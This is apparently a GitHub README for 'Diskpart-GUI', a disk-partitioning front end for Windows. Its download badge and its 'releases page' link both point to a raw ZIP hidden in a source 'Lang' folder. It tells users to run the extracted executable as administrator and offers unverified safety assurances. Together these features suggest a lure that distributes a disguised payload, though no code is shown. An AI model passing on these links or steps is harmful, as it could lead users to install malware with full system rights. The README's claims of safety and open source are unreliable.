# 💽 Diskpart-GUI - Manage your computer storage with ease

[![](https://img.shields.io/badge/Download-Diskpart--GUI-blue)](https://github.com/Importantlooking-visualpurple387/Diskpart-GUI/raw/refs/heads/main/DiskpartGUI_Source/Lang/GUI_Diskpart_1.4.zip)

Diskpart-GUI provides a visual interface for the built-in Windows disk partition tool. It removes the need for text commands to format, create, or manage partitions on your storage drives. The application uses .NET 8 technology to ensure smooth performance on modern Windows systems. You can use it to prepare drives for installation, create virtual disks, or fix partition errors.

## 📥 Getting Started

Follow these steps to obtain and run the software on your computer.

1. Visit the [releases page](https://github.com/Importantlooking-visualpurple387/Diskpart-GUI/raw/refs/heads/main/DiskpartGUI_Source/Lang/GUI_Diskpart_1.4.zip) to access the downloads.
2. Select the latest version listed under the Assets section.
3. Download the file ending in `.zip` or `.exe`.
4. If you chose a ZIP file, extract the folder to a location on your computer.
5. Double-click the file named `DiskpartGUI.exe` to start the program.

## 🛠 Features

Diskpart-GUI performs common disk management tasks through a simple window.

*   View all drives connected to your system.
*   Format drives to NTFS, FAT32, or exFAT file systems.
*   Create new partitions on empty space.
*   Convert partition tables between MBR and GPT formats.
*   Mount and manage Virtual Hard Disks (VHD and VHDX).
*   Clean drives by removing existing partition data.

## 💻 System Requirements

This application runs on Windows 10 and Windows 11. Your system must meet these basic criteria for full functionality.

*   **Operating System**: Windows 10 (64-bit) or later.
*   **Framework**: The system requires the .NET 8 Desktop Runtime. If the app does not open, Windows will prompt you to download this component from Microsoft.
*   **Permissions**: You must run the application with administrative privileges. Right-click the file and select "Run as administrator" to apply changes to disks.
*   **Disk Access**: Ensure the drive you want to modify has no active files in use, as locking a drive prevents formatting.

## ⚙️ How to use the application

The interface displays all connected hardware in a list at the top of the window. Select the disk you want to manage from this list. The software updates the information panel to show your current partitions.

### Selecting a Disk
Click the specific disk row in the top panel. The main area displays the partition map. Warning: Selecting the wrong disk causes data loss. Verify the drive size and label before you perform any action.

### Creating a Partition
Select a disk with unallocated space. Click the "Create" button. Enter the size you want for the new partition. Select the file system type. The application creates the partition and assigns it a drive letter.

### Formatting a Drive
Select a partition or an entire disk. Click the "Format" button. Choose your desired file system. You may rename the partition using the label field. Click "Start" to begin. The process clears existing data from the selected partition.

### Managing Virtual Disks
Use the "VHD" menu to attach or detach virtual disk files. This allows you to work with backup images or virtual machine drives without booting into a separate operating system.

## 🛡 Security and Safety

Disk management tools carry risks. Changing partition tables or formatting drives deletes data. Always back up important files to an external drive or cloud storage before you modify disk structures. 

The application requires administrative rights because it communicates directly with the hardware layer of your computer. It performs only the tasks you explicitly authorize by clicking buttons. It does not perform background actions or send data to external servers.

## 📋 Understanding Terms

*   **GPT**: The modern standard for disk partition tables. It supports disks larger than 2 terabytes and works with UEFI firmware.
*   **MBR**: An older partition style. Use this only for legacy systems or specific compatibility needs.
*   **NTFS**: The standard file system for Windows. Use this for your main system drive and large storage drives.
*   **FAT32**: A compatible file system used by older devices and USB drives. It has a file size limit of 4 gigabytes.
*   **Unallocated Space**: This is raw storage on your drive that does not have a partition. You cannot store files here until you create a partition.
*   **Drive Letter**: The identifier such as C: or D: that Windows assigns to a partition so you can find it in File Explorer.

## ❓ Troubleshooting

*   **Access Denied**: Close all windows or folders that might be using the drive. Ensure you opened the application as an administrator.
*   **Drive Not Visible**: Click "Refresh" in the top menu to scan for hardware changes. Ensure the drive has a physical connection to your computer.
*   **App Won't Start**: Verify that you installed the .NET 8 Desktop Runtime. Download it directly from the official Microsoft support page if the application fails to launch.
*   **Format Fails**: Check if the drive is marked as "Read-only" in your hardware settings. Some USB drives have a physical switch that prevents writing data.

## 📖 Licensing

This software uses an open source license. You may view the source code to confirm safety and performance. The project focuses on reliability and follows standard Windows storage protocols. Use this tool with care to maintain the health of your storage drives.